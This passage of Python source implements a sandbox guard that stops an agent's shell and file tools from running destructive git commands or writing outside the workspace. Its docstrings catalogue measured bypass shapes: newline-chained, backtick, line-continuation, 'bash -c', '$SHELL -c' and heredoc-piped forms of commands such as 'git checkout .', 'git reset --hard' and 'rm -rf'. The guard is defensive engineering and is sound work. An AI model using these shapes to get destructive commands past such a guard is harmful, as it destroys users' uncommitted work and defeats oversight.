        os.path.isabs(p)
        or p.startswith("/")
        or p.startswith("\\")
        or bool(_WINDOWS_SHELL and _WINDOWS_DRIVE_RE.match(p))
    )


def _is_within(path: str, root: str) -> bool:
    """True when ``path`` (absolute) is inside ``root`` (absolute) or equals it.

    Under a Windows shell the comparison canonicalises the separator before the
    prefix test. That is a uniform substitution on both sides, so it cannot
    change which of two real paths contains the other — but it does stop the
    test from depending on which `os.path` (and therefore which ``os.sep``) the
    *guard* is running under, which is what makes issue #1261's containment
    verifiable off Windows. POSIX shells are untouched.
    """
    try:
        rp = os.path.realpath(path)
        rr = os.path.realpath(root)
        if _WINDOWS_SHELL:
            rp = rp.replace("\\", "/")
            rr = rr.replace("\\", "/").rstrip("/")
            return rp == rr or rp.startswith(rr + "/")
        return rp == rr or rp.startswith(rr + os.sep)
    except OSError:
        return False


def check_read_only_file_write(file_path: str, workspace: str | None = None) -> str | None:
    """Read-only sandbox check for the write/edit tools (community issue #979).

    Returns a block reason when the target file is inside the task's workspace
    (the host's working tree — protected by the structural dirty-tree guard) or
    is a protected daemon state file; returns None when allowed.

    Writes OUTSIDE the workspace (memory dir, logs, OS temp) stay allowed so a
    read-only cycle can still record state and write its own artifacts — the
    guard protects the host's uncommitted work, not the agent's own scratch
    space. Mirrors the bash tool's read-only semantics for file tools.
    """
    path = os.path.realpath(os.path.expanduser(file_path))
    if workspace:
        ws = os.path.realpath(os.path.expanduser(workspace))
        if _is_within(path, ws):
            return (
                f"read-only sandbox: blocked file write inside workspace {path!r} "
                "(dirty-tree guard, community issue #979)"
            )
    if path in _protected_paths():
        return (
            f"read-only sandbox: blocked write to protected daemon file {path!r}"
        )
    return None


def check_workspace_write(file_path: str, workspace: str | None = None) -> str | None:
    """workspace-write sandbox check for the write/edit tools (rant 2026-09-01T15:10:23).

    Returns a block reason when the target file is a protected daemon state file,
    is ``~/.emrg`` itself, or is an absolute path outside the workspace root
    (OS temp allowed — mirrors dsh's workspace + backend-promised temp area);
    returns None when allowed.

    Relative paths are assumed in-workspace (cwd = the workspace root), matching
    the bash tool's workspace-write semantics (2026-08-20T15:46:50) and dsh's
    writableRoots single-source + tool-symmetry design. Without this check the
    write/edit tools let ``workspace-write`` sessions write anywhere outside the
    session cwd, while the bash tool is correctly blocked — the asymmetric hole
    this function closes.
    """
    if not file_path:
        return None
    expanded = os.path.expanduser(file_path)
    if not _is_absolute_path(expanded):
        # Relative target: assumed in-workspace (cwd = the workspace root).
        return None
    real = os.path.realpath(expanded)
    if real in _protected_paths():
        return (
            f"workspace-write sandbox: blocked write to protected daemon file {file_path!r}"
        )
    emrg_home = os.path.realpath(os.path.expanduser("~/.emrg"))
    if real == emrg_home:
        return (
            f"workspace-write sandbox: blocked destructive write to {file_path!r} "
            "(would erase the daemon's data directory)"
        )
    workspace_real = (
        os.path.realpath(os.path.expanduser(workspace)) if workspace else None
    )
    # Allow: inside workspace, inside the OS-temp roots (normalized), or inside
    # a trusted zone (~/.emrg/evolution/.emrg — the evolution module's own data
    # root, issue #1093 self-regression). Everything else is blocked.
    allowed_srcs = [workspace_real] if workspace_real else []
    allowed_srcs += list(_trusted_write_zones())
    allowed_srcs += list(_temp_write_roots())
    if not any(
        src and (_is_within(real, src) or real == src) for src in allowed_srcs
    ):
        return (
            f"workspace-write sandbox: blocked write outside workspace {file_path!r}"
        )
    return None


def _tokenize_command(cmd: str) -> list[str]:
    """Split a shell command into tokens, preserving operators like ``&&``.

    Uses ``shlex`` so quoting is respected: a mutator mentioned inside a string
    literal is one token, not a command word — which is what stops the guard
    from refusing a command that merely *talks about* `git merge` (issue #1156
    facet D). Falls back to a whitespace split when the input is unparseable
    (an unterminated quote), because a guard that crashes on odd input is worse
    than one that over-blocks it.

    ⚠️ The punctuation set is explicit and **includes the backtick**. `shlex`'s
    default punctuation set is `();<>|&` — it omits `` ` ``, so a command
    substitution stayed glued to its words: `` `git checkout .` `` tokenised as
    `` ['`git', 'checkout', '.`'] `` and the program word never matched `git`.
    Measured against master 2026-09-12 (`cyc20260912-190602`): the raw-text guard
    blocked all four backtick shapes and this parsed guard allowed all four —
    an under-block in the destructive direction, introduced by the same
    migration that fixed the over-blocks. `$( … )` was unaffected because its
    `git` is already a separate token, which is what made the hole invisible to
    the substitutions that were covered.

    ⚠️ **Newline is a separator, and it had to be added in two places.** The
    sets (`_COMMAND_SEPARATORS`, `_SHELL_SEPARATORS`) have always listed `"\n"`,
    but `shlex` never emitted it: a newline was *whitespace*, so it vanished and
    glued the two lines' tokens into one stream. `_runs_as_a_command` then
    looked left past the second command and found the first command's operand —
    not a separator — and answered "data, not an invocation". Measured on master
    `addcb5ee` in the `read-only` tier: `git stash drop` blocked,
    `git stash drop; echo done` blocked, and `echo done` + newline +
    `git stash drop` **allowed**. That is the 2026-08-20 data-loss class this
    tier exists to make structurally impossible, reachable by pressing Enter.
    `git config user.name x`, `git clean -fd` and `git checkout .` behind any
    read behaved the same.

    ⚠️ The write-target extractor (`_extract_write_targets`, the other
    tokenizer) is **not** affected, and I checked rather than assumed: it walks
    tokens matching *command words* (`rm`, `mv`, `tee`) wherever they sit, so it
    needs no separator and already found `rm -rf /tmp/a` at the end of a
    newline-separated line (11 destructive shapes measured, 0 differing between
    bare, `;`-chained and newline-chained). The hole is specific to the
    position-sensitive walk in `_runs_as_a_command` — which is exactly the walk
    that decides whether a `git` token is an invocation at all.

    Fix: put `\n` in the punctuation set (so it becomes its own token) **and**
    take it out of `lex.whitespace` (otherwise the whitespace branch still
    splits on it and it is never emitted as a token). A newline *inside* quotes
    is unaffected — quoting is resolved before either rule — so
    ``echo "a<newline>b"`` stays one argument, as the shell makes it.
    """
    cmd = _protect_windows_backslashes(_strip_line_continuations(cmd))
    try:
        lex = _shell_lexer(cmd, _PUNCTUATION_CHARS)
        lex.whitespace_split = True
        # `\n` is a separator token, not whitespace to be discarded — see above.
        lex.whitespace = " \t\r"
        return _restore_windows_backslashes(_unfuse_newlines(list(lex)))
    except ValueError:
        return _restore_windows_backslashes(cmd.split())


# The punctuation set handed to `shlex` above. Adjacent characters in this set
# are fused into ONE token, which is the whole reason `_unfuse_newlines` exists.
_PUNCTUATION_CHARS = "();<>|&`\n"


def _unfuse_newlines(tokens: list[str]) -> list[str]:
    """Emit each newline as its own token when `punctuation_chars` fused it in.

    Making `\n` punctuation was necessary but not sufficient (#1233): shlex
    groups *adjacent* punctuation into a single token, so `echo a;` followed by
    a newline arrives as ``";\n"``, a blank line as ``"\n\n"``, and `cmd &&`
    followed by a newline as ``"&&\n"``. None of those is `in
    _COMMAND_SEPARATORS`, so the position-sensitive walks answered "data, not an
    invocation" — the hole #1233 closed for a bare newline, open again one
    character later. Measured on master `e6eaaee4`, `read-only` tier: 40 shapes
    ALLOWED that block when the same writer is written inline — 5 writers
    (`git stash drop`, `git checkout .`, `git clean -fd`, `git config user.name
    x`, `git reset --hard`) × 8 fused forms (a blank line, two blank lines,
    ``";\n"``, ``"\n;"``, ``"&&\n"``, ``"\n&&"``, ``"|\n"``, ``"\n(\n"``).
    Five of those 8 forms are shapes a shell really runs the writer in (measured
    against both `/bin/sh` and `/bin/bash` with a side-effect probe); the other
    three — ``"\n;"``, ``"\n&&"``, ``"\n(\n"`` — are parse errors in both, so
    closing them is conservative rather than necessary, and 25 of the 40 are
    shapes whose writer a shell executes.

    Only tokens that are *entirely punctuation* are split, and that is exactly
    what separates a fused run from a word: ``echo "a<newline>b"`` is one
    argument to the shell, shlex hands it over as one token containing letters,
    and it is left alone. The other punctuation runs are left alone too, which
    matters — `_extract_write_targets` matches a redirect *operator* by spelling,
    so splitting ``">>\n"`` into ``">"``, ``">"`` would name the second `>` as the
    target instead of the file.
    """
    if not any("\n" in tok and tok != "\n" for tok in tokens):
        return tokens
    out: list[str] = []
    for tok in tokens:
        if tok != "\n" and "\n" in tok and all(c in _PUNCTUATION_CHARS for c in tok):
            out.extend(p for p in re.split(r"(\n)", tok) if p)
        else:
            out.append(tok)
    return out


def _strip_line_continuations(cmd: str) -> str:
    """Remove every backslash-newline the shell removes before it parses.

    A backslash immediately followed by a newline is a **line continuation**: the
    shell deletes both characters and joins the lines, so the two lines are ONE
    command and nothing separates them. Left in place, `shlex` glues the newline
    to the *next word*, so the command word stops being a token at all. Measured
    on master `e6eaaee4`, `read-only` tier: `x=1 \\<newline>git checkout .`
    tokenises to ``['x=1', '\\ngit', 'checkout', '.']`` — there is no ``git``
    token — and the shell runs ``git checkout .`` in both ``/bin/sh`` and
    ``/bin/bash``. Three spellings reach that way (bare, after an assignment,
    after a separator) and all three are ALLOW on master.

    Removing it is not a heuristic: it is exactly what the shell does, so it
    cannot hide a command the shell would run. It also keeps the *mention* case
    honest — ``echo done \\<newline>git checkout .`` joins into a single
    ``echo`` whose ``git`` is an argument, and both the shell and the guard read
    it that way.

    Two things are easy to get wrong, and both are measured:

    * **A CR is not a newline.** `\\<CR><LF>` is `\\` escaping the CR, then a
      CRLF line break — *two commands*, the second one real (measured: the shell
      runs the mutator after it). Only `\\<LF>` is a continuation, so the CR is
      left to the escape-pair rule below and the LF stays a separator.
    * **An escaped backslash ends the story.** ````echo a\\<newline>git checkout
      .```` is not a continuation: the shell consumes the two backslashes as
      literal pairs, so the newline is a **real separator** and the mutator runs.
      Pairing a backslash with the newline without first asking whether it was
      itself escaped deletes that separator and lets the leftover backslash
      escape the first letter of the next word, so the command word stops being a
      token at all — the same failure this function exists to prevent, one
      character deeper. Escapes are therefore consumed as **pairs**.
    * **A quoted apostrophe is data.** In ````echo "x'" ; a=1 \\<newline>git
      checkout .```` the `'` sits inside double quotes, so it does not open a
      single-quoted string and the continuation is real. Tracking `'` alone
      missed it; `"` is tracked as a second state, and the strip runs inside
      double quotes because the shell removes the continuation there too.
    """
    if "\\\n" not in cmd and "\\\r\n" not in cmd:
        return cmd
    out: list[str] = []
    in_single = False
    in_double = False
    i = 0
    while i < len(cmd):
        ch = cmd[i]
        if ch == "'" and not in_double:
            in_single = not in_single
        elif ch == '"' and not in_single:
            in_double = not in_double
        elif ch == "\\" and not in_single:
            j = i + 1
            if cmd[j:j + 1] == "\n":
                i = j + 1
                continue
            # A backslash escapes the next character, so the two are consumed
            # together: an escaped backslash is never itself paired with the
            # newline that follows it (clause A).
            out.append(ch)
            if j < len(cmd):
                out.append(cmd[j])
                i = j + 1
            else:
                i = j
            continue
        out.append(ch)
        i += 1
    return "".join(out)


def _runs_as_a_command(tokens: list[str], i: int) -> bool:
    """Whether ``tokens[i]`` is in *command position* — i.e. the shell will run it.

    This is the difference between an invocation and an argument, and it is the
    whole reason a parser is used here rather than a scan: `grep -rn git .` and
    `git status` both contain the token `git`, but only the second runs it.

    A token is in command position when:
      * it is first in the stream, or
      * the token before it is a **command separator** (`&&`, `||`, `;`, `|`,
        `&`, newline), a grouping/negation operator (`(`, `{`, `!`), or
      * the tokens before it are **command wrappers** and their options/values
        (`env`, `sudo`, `xargs`, `nohup`, `time`, `timeout`, `nice`, `doas`,
        `setsid`, `stdbuf`, `command`, …), or
      * the token before it is a `VAR=value` environment assignment
        (`FOO=1 git checkout .` really does run git).

    ⚠️ The wrapper case must keep working, and it needs the flag's **value**
    skipped, not just the flag. The obvious fix for the over-block — "only
    position 0 can be an invocation" — would under-block every wrapper prefix,
    and `env git checkout .` genuinely destroys uncommitted work; a first attempt
    that skipped only flags left `sudo -u root git checkout .`, `timeout 5 git
    checkout .`, `nice -n 5 git checkout .`, `xargs -I{} git checkout .` and
    `stdbuf -o0 git checkout .` all allowed (5 of 44 mutator shapes, measured).
    So a non-flag token that follows a flag is treated as that flag's value and
    skipped.

    That value-test is an **over-approximation**, deliberately: whether a flag
    takes a value is a per-command fact, and enumerating which flags do is the
    same enumeration trap that made the wrapper's `-c` walk unsound. The cost is
    that `xargs -I{} grep git` — where `grep` is the command and `git` its
    argument — is read as a wrapper invocation and blocked. That is a false block
    in the harmless direction, and it is the trade this guard always makes: a
    refused command is loud, and silent data loss is not.
    """
    j = i - 1
    while j >= 0:
        tok = tokens[j]
        if tok in _SHELL_SEPARATORS or tok in _COMMAND_POSITION_OPERATORS:
            return True
        if tok in _SHELL_KEYWORD_POSITION:
            return True
        if _is_env_assignment(tok):
            j -= 1
            continue
        if _basename(tok) in _COMMAND_WRAPPERS:
            # The candidate is this wrapper's command argument.
            return True
        if tok.startswith("-"):
            j -= 1
            continue
        # A non-flag token: it belongs to a prefix (a flag's value, or a
        # wrapper's own argument) when the token before it is a flag or a
        # wrapper. Otherwise it is a command word and the candidate is one of
        # its arguments — data, not an invocation.
        if j - 1 >= 0:
            left = tokens[j - 1]
            if left.startswith("-"):
                j -= 2
                continue
            if _basename(left) in _COMMAND_WRAPPERS:
                return True
        return False
    return True


def _git_verbs(tokens: list[str]) -> list[tuple[str, list[str]]]:
    """Resolve every ``git`` invocation in a token stream to ``(verb, rest)``.

    Walks the token stream, and at each ``git`` token skips git's *global*
    options to find the resolved verb (issue #1156: a global option sits
    exactly where a raw-text regex expects the subcommand). Returns one entry
    per invocation, so a chained command is judged by all of its invocations.

    ⚠️ Only a ``git`` token in **command position** is an invocation
    (`_runs_as_a_command`). Treating every `git` token as one over-blocked any
    command that merely *names* git as an argument — `grep -rn git .` was read
    as the invocation `git .`, and the fail-closed default then refused a plain
    search (measured against master 2026-09-12: 9 of 30 read shapes regressed,
    all in that class). The quoted-mention case was already handled because
    tokenising keeps a string literal whole; the *unquoted argument* is the same
    defect one level down, and position is what distinguishes it.

    ``rest`` is the tokens after the verb **up to the next command separator**,
    needed to decide flag/subcommand-dependent verbs (`git branch -D` writes,
    `git branch -a` reads).

    Bounded, because it once was not: an unbounded ``rest`` handed the *next*
    command's tokens to a verdict that decides on the positional count, so
    `git config user.name && git config user.email` — the identity check every
    cycle is told to run (`emrg/server/evolution_prompt.md`) — was read as
    `git config` with four positionals and refused as a mutation, while the same
    command alone was allowed. The shape affects every positional-count-decided
    verb (`config`, `tag`, `branch`, `remote`, `submodule`, `worktree`).
    """
    out: list[tuple[str, list[str]]] = []
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if _basename(tok) != "git" or not _runs_as_a_command(tokens, i):
            i += 1
            continue
        inv = _git_invocation_at(tokens, i)
        if inv is None:
            i += 1
            continue
        j, verb, rest = inv
        out.append((verb, rest))
        i = j + 1
    return out


def _git_invocation_at(tokens: list[str], i: int) -> tuple[int, str, list[str]] | None:
    """``(verb token index, verb, tokens after it)`` for the ``git`` at ``i``.

    The global-option skip that finds a git subcommand lives here rather than
    inline in `_git_verbs`, because a second caller needs the same answer: the
    write-target walk has to know *which verb* a `git` token introduced before it
    can read that verb's file operand (`_git_config_write_targets`). Two copies
    of the walk would be two places to fix the day git adds another option that
    takes a value — exactly the drift the shared helpers in this file exist to
    prevent.

    Returns ``None`` when the invocation has no verb to resolve: a bare trailing
    ``git``, or one followed only by global options.
    """
    j = i + 1
    # Skip global options (and the separate value of options that take one).
    while j < len(tokens):
        nxt = tokens[j]
        if nxt in _GIT_GLOBAL_WITH_VALUE:
            j += 2
            continue
        if nxt.startswith("-"):
            j += 1
            continue
        break
    if j >= len(tokens):
        return None
    end = j + 1
    while end < len(tokens) and tokens[end] not in _COMMAND_SEPARATORS:
        end += 1
    return j, tokens[j], tokens[j + 1:end]


def _git_invocation_is_mutator(verb: str, rest: list[str]) -> str | None:
    """Classify one resolved git invocation. Returns the offending verb, or None.

    **Fail-closed**: a verb is allowed only when it is known to print
    information. Anything else — an unlisted verb, and therefore every
    subcommand git adds in future — blocks. The blocklist this replaced had the
    default inverted, which made the safe set the *unlisted* one; with 169
    subcommands that can never be enumerated, that is a guard against only the
    names someone happened to type.

    The decision is on the *effect*, not the spelling: read-only inspections
    (`git stash list`, `git worktree list`, `git submodule status`,
    `git branch -a`, `git remote -v`, `git config -l`) are read from the
    resolved verb + flags, so they stay allowed without an exemption pattern to
    keep in sync.
    """
    if verb in _GIT_READ_VERBS:
        return None
    if verb in _GIT_SHAPE_DECIDED:
        return _shape_decided_verdict(verb, rest)
    # Unlisted verb: block. This is the fail-closed default and the whole point
    # of the design — `checkout-index`, `mktree`, `filter-branch`, `init`,
    # `clone`, `revert`, and any future subcommand land here.
    return verb


def _flag_part(tok: str) -> str:
    """The spelling a flag table should be asked about, for ``tok``.

    A flag and its value may be written as one token or two, and the tables hold
    the flag. Comparing whole tokens therefore decides by *spelling* while
    claiming to decide by flag: measured 2026-09-16 against master, read-only
    ALLOWED `git branch --set-upstream-to=origin/main` and `git branch
    -uorigin/main` (both really did set the upstream) while the two-token forms
    `--set-upstream-to origin/main` / `-u origin/main` were BLOCKED — the same
    write, three spellings, two verdicts. `git branch -dold` is refused by git
    itself (rc=129), so widening here can only over-block a shape git rejects.

    Only a leading flag is rewritten: `-` alone is a filename, ``--`` alone is
    the argument terminator, and a short option keeps its first letter (`-u`),
    which is how git reads it too. Nothing else about the token is touched, so
    a path or a pattern is still compared as written.
    """
    if not tok.startswith("-") or tok in ("-", "--"):
        return tok
    if tok.startswith("--"):
        return tok.split("=", 1)[0]
    return tok[:2]


def _git_positionals(rest: list[str],
                     extra_value_opts: frozenset[str] = frozenset()) -> list[str]:
    """The non-option arguments of a git subcommand, option *values* excluded.

    The same walk as the invocation splitter's global-option skip, one level
    down: an option that takes a separate value consumes the next token, so
    `["--ref", "refs/notes/x", "list"]` yields `["list"]` instead of
    `["refs/notes/x", "list"]`. A value is never a subcommand, and treating one
    as a subcommand is how `git reflog -n 5` was refused as a mutator (#1240).

    `extra_value_opts` is for a verb whose own options are not in the shared set
    — `git config --file <p>` is the measured case (#1273): the shared set holds
    the options that decide a *subcommand*, while this one decides a *verdict*.
    """
    value_opts = _GIT_SUBCOMMAND_WITH_VALUE | extra_value_opts
    out: list[str] = []
    i = 0
    while i < len(rest):
        tok = rest[i]
        if tok in value_opts:
            i += 2
            continue
        if tok.startswith("-"):
            i += 1
            continue
        out.append(tok)
        i += 1
    return out


def _shape_decided_verdict(verb: str, rest: list[str]) -> str | None:
    """The verdict for a verb whose subcommand / flags decide its effect.

    Returns the verb when the invocation writes, or None when it is a proven
    read. Every branch treats "not recognisably a read" as a write.
    """
    # Two independent readings of the same token list, and both are needed:
    # `_git_positionals` skips an option's *value* (so `git reflog -n 5` reads
    # `5` as neither a subcommand nor a positional — issue #1240), while `flags`
    # compares each option by its part, so an attached value cannot hide a flag
    # (issue #1256). Taking either one alone re-opens the other's defect.
    positional = _git_positionals(rest)
    flags = [_flag_part(t) for t in rest]
    sub = next(iter(positional), None)
    if verb == "stash":
        # `stash list` / `stash show` read; a bare `git stash` saves and cleans
        # the tree, so it writes.
        return None if sub in ("list", "show") else verb
    if verb == "worktree":
        # `worktree list` reads; a bare `git worktree` only prints usage.
        return None if sub is None or sub == "list" else verb
    if verb == "submodule":
        # `submodule status` / `summary` read; a bare `git submodule` only
        # prints usage.
        return None if sub is None or sub in ("status", "summary") else verb
    if verb == "remote":
        # `remote -v` / `show` / `get-url` read; `set-url`/`add`/`remove` write.
        return None if sub is None or sub in ("show", "get-url", "v") else verb
    if verb in ("branch", "tag"):
        # A listing flag makes this a read even with a pattern argument; a
        # delete/force/move flag makes it a write. Both tests ask `flags`, not
        # `rest`, so an attached value (`--delete=old`, `-uorigin/main`) is the
        # same flag as the two-token form.
        if any(t in _GIT_WRITE_FLAGS for t in flags):
            return verb
        if any(t in _GIT_LIST_FLAGS for t in flags):
            return None
        # `git branch <name>` / `git tag <name>` create; only the bare form
        # (no positional argument at all) is the listing read.
        return None if not positional else verb
    if verb == "config":
        if any(t in _GIT_CONFIG_WRITE_FLAGS for t in rest):
            return verb
        if any(t in _GIT_CONFIG_READ_FLAGS for t in rest):
            return None
        # git 2.46+ spells the same operations as subcommands (`git config unset
        # k`); the first positional decides which, and only a word that is one of
        # them counts — a config key is not a subcommand.
        #
        # This verb's own value-taking options are walked out first (#1273): the
        # shared set holds the options that decide a *subcommand*, so `--file
        # <p>` left `<p>` among the positionals and the count then read a pure
        # read (`git config --file <p> user.name`, measured: rc=1, nothing
        # written) as the write it is one token away from.
        positional = _git_positionals(rest, _GIT_CONFIG_VALUE_OPTS)
        subcommand = next(iter(positional), None)
        if subcommand in _GIT_CONFIG_WRITE_SUBCOMMANDS:
            return verb
        if subcommand in _GIT_CONFIG_READ_SUBCOMMANDS:
            return None
        # `git config <key>` with no value is a read; `key=value` writes. A lone
        # positional key is ambiguous, so treat a single positional as a read and
        # anything that looks like an assignment as a write.
        if any("=" in t for t in positional):
            return verb
        return None if len(positional) <= 1 else verb
    if verb == "interpret-trailers":
        # Prints to stdout by default; `--in-place` rewrites its file operand
        # in place — the same effect as `sed -i`, which read-only blocks.
        return verb if "--in-place" in rest else None
    if verb == "credential":
        # `fill` / `get` read; `approve` / `reject` write the credential store.
        return None if sub in ("fill", "get") else verb
    if verb == "hash-object":
        # `git hash-object <file>` computes and prints an object name — a read.
        # `-w` additionally writes the object into the database.
        return verb if "-w" in rest else None
    if verb == "reflog":
        # Bare `git reflog` is `reflog show` — it prints. `expire` / `delete` /
        # `drop` rewrite the reflog, so they stay blocked, as does any
        # subcommand git adds later (fail-closed).
        return None if sub in (None, "show", "list", "exists") else verb
    if verb == "notes":
        # `list` / `show` print; `add` / `copy` / `append` / `edit` / `remove` /
        # `prune` write the notes ref. Bare `git notes` prints the note list.
        return None if sub in (None, "list", "show") else verb
    if verb == "bisect":
        # Only the pure reporters. `start` / `good` / `bad` / `skip` / `reset` /
        # `run` write `.git/BISECT_*`, and `replay` can rewrite history.
        return None if sub in ("log", "view", "visualize") else verb
    return verb


def _is_env_assignment(tok: str) -> bool:
    """Whether ``tok`` is a shell variable assignment (`FOO=1`, `PATH=/x:$PATH`).

    Distinguished from a command word so `FOO=1 git checkout .` still reads as a
    git invocation: the shell strips leading assignments and runs what follows.
    """
    return bool(_ENV_ASSIGNMENT_RE.match(tok))


def _basename(tok: str) -> str:
    """The command word without its directory prefix or extension.

    `/usr/bin/git` and `git.exe` name the same program as `git`; a guard that
    only recognises the bare spelling is a guard against the polite form of
    the command. (On Windows the shell resolves `git` to `git.exe`, so the
    extension form is the one that actually runs there.)

    A leading `VAR=` is stripped for the same reason: `FOO=1 git checkout .`
    runs git, and the assignment is not part of the program word. Command
    substitution used to need stripping here too, and does not any more — the
    tokenizer now splits on the backtick, which is the *structural* fix; keeping
    a strip here as well would have hidden the fact that the token stream was
    wrong, and would only have covered the substitutions that happen to wrap the
    program word rather than the shape.
    """
    base = tok.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
    if base.lower().endswith(".exe"):
        base = base[:-4]
    if "=" in base:
        head, _, tail = base.partition("=")
        if head.isidentifier():
            base = tail
    return base


def _nested_command_texts(tokens: list[str]) -> list[str]:
    """The command strings a shell will itself re-parse out of ``tokens``.

    Returns the argument of every `sh -c <text>` (and the other wrapper
    shells) and every `eval <text>`, so the caller can recurse into them.

    Why this is needed rather than optional: tokenising splits a command into
    an outer invocation plus an opaque string literal, and a string literal is
    data. `sh -c 'git checkout .'` therefore parses as the command `sh` with a
    quoted payload — no git invocation at all. The pre-parsing guard blocked
    it, because a raw-text regex over the whole line did not care where the
    word sat. Dropping that scan silently made 5 wrapper shapes writable under
    read-only (measured 2026-09-12 against master: `sh -c` / `bash -c` /
    `zsh -c` / `dash -c` / `eval` all went from blocked to allowed), which is
    the one direction this guard must never move in. So the parsed design has
    to model the nesting explicitly.

    The wrapper is recognised by its *name*, and then **every remaining token
    is treated as a possible payload** — the same over-approximation `eval`
    already gets. Locating the `-c` flag instead looks tighter but is unsound:
    it requires enumerating how a flag may be spelled, and the enumeration is
    always incomplete. Measured 2026-09-12 against the first version of this
    function, which walked to `-c`:

      - short forms worked (`bash -c`, `bash -lc`, `bash -x -c`);
      - but a **long option** or an **option value** ended the walk before
        `-c` was ever reached, so `bash --login -c 'git checkout .'`,
        `bash --noprofile -c ...`, `bash --posix -c ...`, `bash -o pipefail
        -c ...` and `zsh --login -c ...` were all ALLOWED under read-only —
        9 of 14 wrapper shapes, every one of them a mutator. Driven end to
        end through `BashTool.execute`, 3 of 4 destroyed uncommitted work
        that master blocks.
      - this is the #461 class exactly: matching one spelling of a class while
        the other spelling passes. A guard cannot win that enumeration, so it
        must not depend on it.

    Over-approximating costs only that a wrapper followed by a non-command
    (e.g. `bash script.sh`) recurses into a filename, which parses to no git
    invocation and stays allowed. Erring toward *blocking* is the safe
    direction for this guard; erring toward data loss is not.

    An **un-resolvable** wrapper is treated the same way (issue #1244): a
    program word that is a variable reference may well be the shell, and the
    guard cannot tell — measured on master, `$SHELL -c 'git checkout .'`,
    `${SHELL} -c …`, `"$SHELL" -c …`, `env FOO=1 $SHELL -c …` and
    `sudo $SHELL -c …` all answered ALLOW at read-only and all discarded the
    uncommitted edit. Its payload is therefore read as a possible command, which
    only ever *adds* blocking — the walk stays monotone in the safe direction.
    """
    out: list[str] = []
    for i, tok in enumerate(tokens):
        if _basename(tok) in _SHELL_WRAPPERS:
            # `sh -c <text>` — take everything after the wrapper and let the
            # recursive parse decide what is a command. Do NOT locate `-c`:
            # every way of spelling an option before it is a hole.
            out.extend(tokens[i + 1:])
        elif _basename(tok) in _SHELL_EVALUATORS:
            # `eval <text...>`: every remaining token is re-parsed as a command.
            out.extend(tokens[i + 1:])
    out.extend(_unresolved_wrapper_payloads(tokens))
    return out


def _operand_names_stdin(args: list[str]) -> bool:
    """Whether ``args`` name stdin as a message reader's input file.

    Two spellings, both measured on git 2.50.1: the value as its own token
    (`-F -`, `--file -`) and attached (`-F-`, `--file=-`). `-F=-` is not one of
    them — git opens the file ``=-`` and fails — so it is not counted, and a
    `-F`/`--file` whose value is anything else is a real filename.
    """
    for i, arg in enumerate(args):
        if arg in _STDIN_OPERAND_ATTACHED:
            return True
        if arg in _STDIN_OPERAND_SEPARATE and i + 1 < len(args) and args[i + 1] == "-":
            return True
    return False


def _owns_stdin_as_data(prefix: list[str]) -> bool:
    """Whether this simple command reads the heredoc on its stdin as data.

    ``prefix`` is the raw token span before the ``<<`` opener, env assignments
    included: the shell strips those before running the command, so they are not
    part of the command word — but an env prefix is also how `GIT_CONFIG_COUNT`
    / `GIT_CONFIG_KEY_0` / `GIT_CONFIG_VALUE_0` reaches a tool, and the guard
    reads text, so it cannot tell those assignments from a harmless `FOO=1`. An
    env prefix therefore forfeits the mask, which is the fail-closed direction.

    Beyond that: a named data reader owns its stdin whatever the arguments, and
    a message reader owns it only in the invocation that says so — the tool, its
    subcommand, and a stdin operand, with the subcommand read at argv[0] after
    the tool so that no global option can stand between them.
    """
    words = [tok for tok in prefix if not _is_env_assignment(tok)]
    if not words:
        return False
    if _basename(words[0]) in _DATA_READER_CONSUMERS:
        return True
    subs = _STDIN_MESSAGE_READERS.get(_basename(words[0]))
    if subs is None:
        return False
    if len(words) != len(prefix):
        return False                      # env prefix: `GIT_CONFIG_*` lives there
    if len(words) < 2 or words[1] not in subs:
        # The subcommand must be argv[0] after the tool. A global option there is
        # how `-c <name>=<value>` and `--config-env=` arrive, and a config value
        # can make the subcommand run a program (`core.editor`); refusing the
        # *position* instead of enumerating the options is the structural test.
        return False
    return _operand_names_stdin(words[2:])


def _heredoc_delimiters_read_as_data(line: str) -> list[str]:
    """Delimiters of the heredocs opened on ``line`` whose body is data.

    ``line`` is one line of the command (the shell reads a heredoc's body from
    the lines *after* the opener, which the caller walks). The consumer is the
    command word of the simple command that owns the ``<<``: for
    `cat <<EOF > out` that is `cat`.

    Two things this refuses to call a heredoc, both deliberate:

    * a ``<<`` that is not its own token — `grep -n "x <<EOF" f` keeps the
      operator inside the argument token, measured, so a *mention* of ``<<``
      in a string is not an opener (this is why the scan runs on tokens);
    * a delimiter that is not an identifier — `python3 -c 'print(1 << 2)'`
      must not open anything.

    And one thing it refuses to call data: an owning command that pipes
    anywhere. `cat <<EOF | $SHELL` feeds the very text we would stop reading
    into whatever the pipe names, and a pipe target spelled as a variable
    cannot be resolved statically, so a pipe forfeits the mask entirely.

    The consumer is judged per *invocation*, not per tool (issue #1320):
    `_owns_stdin_as_data` accepts a named data reader, or the narrower case of a
    message reader — `git commit` / `git tag` — whose invocation is nothing but
    the tool, that subcommand and an operand naming stdin.
    """
    toks = _split_command_tokens(line)
    segments: list[list[int]] = [[]]      # token indices, so the pipe test
    for idx, tok in enumerate(toks):      # can look past the segment
        if tok in _COMMAND_SEPARATORS:
            segments.append([])
        else:
            segments[-1].append(idx)
    out: list[str] = []
    for seg in segments:
        for pos, idx in enumerate(seg):
            if toks[idx] != "<<" or pos + 1 >= len(seg):
                continue
            delim = toks[seg[pos + 1]].lstrip("-")
            if not (delim and delim.isidentifier()):
                continue
            prefix = [toks[j] for j in seg[:pos]]
            if not prefix or not _owns_stdin_as_data(prefix):
                continue
            # A pipe anywhere after the opener forfeits the mask: `cat <<EOF |
            # $SHELL` (and `${SHELL}`, and any unresolved target) would run the
            # text this would stop scanning. The test looks at the whole line,
            # not the owning segment — the pipe is a segment separator, so the
            # segment itself never contains it (measured: the first version of
            # this function allowed `| $SHELL` for exactly that reason).
            if "|" in toks[idx:]:
                continue
            out.append(delim)
    return out


def _mask_data_heredoc_bodies(cmd: str) -> str:
    """Blank the heredoc bodies that no shell will execute, keeping the lines.

    Why this exists (measured against master ``e6eaa4e4`` in the ``read-only``
    tier, 2026-09-15): the scanners parse a command text with the tokenizer, and
    a heredoc body is part of that text — so a body was read as shell code by
    accident of *spelling*. A pure read paid for it:

      - `cat <<'EOF'` + a line `> quoted` + `EOF` → BLOCKED, "blocked
        destructive write targeting 'quoted'" — the target is prose;
      - `cat <<'EOF'` + `a -> b` + `EOF` → BLOCKED, targeting ``'b'``;
